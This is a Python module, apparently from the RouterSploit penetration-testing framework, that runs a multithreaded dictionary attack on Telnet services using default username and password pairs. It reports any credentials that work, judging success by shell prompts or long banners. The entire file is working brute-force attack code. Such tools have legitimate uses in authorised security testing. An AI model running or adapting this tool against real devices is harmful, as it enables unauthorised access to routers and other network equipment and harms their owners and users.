import threading
import telnetlib

from routersploit import *


class Exploit(exploits.Exploit):
    """
    Module perform dictionary attack with default credentials against Telnet service.
    If valid credentials are found, they are displayed to the user.
    """
    __info__ = {
        'name': 'Telnet Default Creds',
        'author': [
            'Marcin Bury <marcin.bury[at]reverse-shell.com>' # routersploit module
         ]
    }

    target = exploits.Option('', 'Target IP address')
    port = exploits.Option(23, 'Target port')

    threads = exploits.Option(8, 'Numbers of threads')
    defaults = exploits.Option(wordlists.defaults, 'User:Pass or file with default credentials (file://)')

    credentials = []

    def run(self):
        self.credentials = []
        print_status("Running module...")

        try:
            tn = telnetlib.Telnet(self.target, self.port)
            tn.expect(["login: ", "Login: "], 5)
            tn.close()
        except:
            print_error("Connection error {}:{}".format(self.target, self.port))
            return

        if self.defaults.startswith('file://'):
            defaults = open(self.defaults[7:], 'r')
        else:
            defaults = [self.defaults]
        
        collection = LockedIterator(defaults)
        self.run_threads(self.threads, self.target_function, collection)

        if len(self.credentials):
            print_success("Credentials found!")
            headers = ("Login", "Password")
            print_table(headers, *self.credentials)
        else:
            print_error("Credentials not found")

    def target_function(self, running, data):
        name = threading.current_thread().name
        print_status(name, 'process is starting...')

        while running.is_set():
            try:
                line = data.next().split(":")
                user = line[0].strip()
                password = line[1].strip()
            except StopIteration:
                break
            else:
                retries = 0
                while retries < 3:
                    try:
                        tn = telnetlib.Telnet(self.target, self.port)
                        tn.expect(["Login: ", "login: "], 5)
                        tn.write(user + "\r\n")
                        tn.expect(["Password: ", "password"], 5)
                        tn.write(password + "\r\n")
                        tn.write("\r\n")

                        (i,obj,res) = tn.expect(["Incorrect", "incorrect"], 5)
                        tn.close()

                        if i != -1:
                            print_error(name, "Username: '{}' Password: '{}'".format(user, password))
                        else:
                            if any(map(lambda x: x in res, ["#", "$",">"])) or len(res) > 500: # big banner e.g. mikrotik
                                running.clear()
                                print_success("{}: Authentication succeed!".format(name), user, password)
                                self.credentials.append((user, password))
                        tn.close()
                        break
                    except EOFError:
                        print_error(name, "Connection problem. Retrying...")
                        retries += 1

                        if retries > 2:
                            print_error("Too much connection problems. Quiting...")
                            return
                        continue 

        print_status(name, 'process is terminated.')
